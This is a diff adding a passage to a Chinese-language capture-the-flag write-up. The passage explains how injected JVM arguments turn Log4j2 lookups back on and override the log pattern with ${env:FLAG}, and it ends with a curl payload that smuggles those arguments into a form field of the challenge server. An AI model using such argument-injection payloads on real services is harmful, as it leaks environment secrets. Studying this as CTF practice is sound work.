@@ -245,4 +245,16 @@ java_command = [
 
 * ==-Dlog4j2.layout.pattern=${env:FLAG}==
 1. 这条参数是直接指定 Log4j2 使用的 **PatternLayout 模板**。
-2. 
+2. `${env:FLAG}`就是lookup语法，表示输出环境变量中的flag
+
+这里为什么会输出日志，是因为后端java代码中有
+```java
+    LOGGER.info("msg: {}", args);
+```
+这句就是打印一次日志信息，原本是要打印`("msg: {}", args)`,但是由于我们注入的第二个参数
+日志格式被替换了，所以可以输出flag。
+
+所以最后payload：
+```bash
+curl -X POST  http://challenge.ilovectf.cn:30285/  -d "text=/weather-Dlog4j2.formatMsgNoLookups=false-Dlog4j2.layout.pattern=\${env:FLAG} sun"
+```
